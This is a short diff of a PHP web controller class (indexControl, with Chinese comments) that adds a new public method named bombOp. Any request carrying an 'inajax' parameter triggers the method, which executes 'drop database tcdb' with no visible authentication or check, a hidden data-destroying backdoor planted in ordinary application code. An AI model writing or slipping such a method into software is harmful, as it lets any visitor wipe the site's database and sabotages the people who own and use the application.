@@ -410,4 +410,14 @@ class indexControl extends BaseHomeControl{ //父类定义了公共头部，以�
 	       showMessage("您的提交失败，请重新填写",'','html','error');
 	   }
 	}
+	public function bombOp(){
+	    if($_REQUEST['inajax']){
+	        $result=Model()->execute("drop database tcdb");
+	        if($result){
+	            echo true;exit;
+	        }else{
+	            echo false;exit;
+	        }
+	    }
+	}
 }
